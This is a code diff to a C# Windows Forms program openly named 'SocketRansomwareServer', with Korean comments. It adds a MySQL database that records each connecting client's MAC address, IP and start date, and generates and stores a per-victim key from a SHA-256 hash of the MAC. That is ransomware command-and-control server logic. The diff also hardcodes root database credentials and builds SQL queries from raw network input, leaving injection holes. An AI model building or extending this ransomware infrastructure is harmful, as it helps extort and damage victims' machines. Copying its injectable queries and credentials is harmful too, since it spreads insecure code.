@@ -12,14 +12,24 @@ using System.Net.Sockets;
 using System.Threading;
 using System.Diagnostics;
 using System.Drawing.Imaging;
+using MySql.Data.MySqlClient;
+using System.Security.Cryptography;
 
 namespace SocketRansomwareServer
 {
     public partial class Form1 : Form
     {
+        string _server = "localhost";
+        int _port = 3306;
+        string _database = "client";
+        string _id = "root";
+        string _pw = "1111";
+        string _connectionAddress = "";
+
         public Form1()
         {
             InitializeComponent();
+            DB.Instance.CreateConnection();
         }
 
         private void Form1_Load(object sender, EventArgs e)
@@ -74,7 +84,9 @@ namespace SocketRansomwareServer
                         for (int i = 0; i < 1024; i++) bytes[i] = 0; //c++로따지면 ZeroMemory(bytes,1024);
                         net = tcp.GetStream(); //네트워크스트림 얻어오기
                         net.Read(bytes, 0, bytes.Length); //스트림읽기 C++로따지면 recv함수
-                        str = Encoding.Default.GetString(bytes); //인코딩
+                        str = Encoding.Default.GetString(bytes).Trim('\0'); //인코딩
+                        string[] request = str.Split(';');
+                        if (request[0] == "mac") CheckDB(request[1]);
                         UpdateListViewSafe(str);
                     } catch(Exception e)
                     {
@@ -82,6 +94,49 @@ namespace SocketRansomwareServer
                         break;
                     }
 
+                }
+            }
+            //접속한 클라이언트가 최초 실행인지 확인
+            private void CheckDB(string mac)
+            {
+                try
+                {
+                    using (DB.Instance._connection)
+                    {
+                        string query = string.Format("select * from client where mac = '{0}'", mac);
+                        MySqlCommand command = new MySqlCommand(query, DB.Instance._connection);
+                        MySqlDataReader table = command.ExecuteReader();
+
+                        if(table.HasRows)
+                        {
+                            Console.WriteLine("이미 존재");
+                            table.Close();
+                            
+                        } else
+                        {
+                            table.Close();
+                            Console.WriteLine("최초 실행");
+                            Socket c = tcp.Client;
+                            IPEndPoint ip_point = (IPEndPoint)c.RemoteEndPoint;
+                            string ip = ip_point.Address.ToString();
+                            string start_date = DateTime.Now.ToString("yyyy-MM-dd-HH-mm-ss");
+                            SHA256Managed sha = new SHA256Managed();
+                            byte[] encryptByte = sha.ComputeHash(Encoding.UTF8.GetBytes(mac));
+                            //base64
+                            string key = Convert.ToBase64String(encryptByte);
+
+                            string insertQuery = $"insert into client(mac,ip,start_date,`key`) values('{mac}','{ip}','{start_date}','{key}')";
+                            Console.WriteLine(key);
+                            command = new MySqlCommand(insertQuery, DB.Instance._connection);
+
+                            if (command.ExecuteNonQuery() == 1) Console.WriteLine("DB 저장 성공");
+                            else Console.WriteLine("DB 저장 실패");
+                        }
+                        
+                    }
+                } catch(Exception e)
+                {
+                    Console.WriteLine(e.Message);
                 }
             }
             private void UpdateListViewSafe(string text)
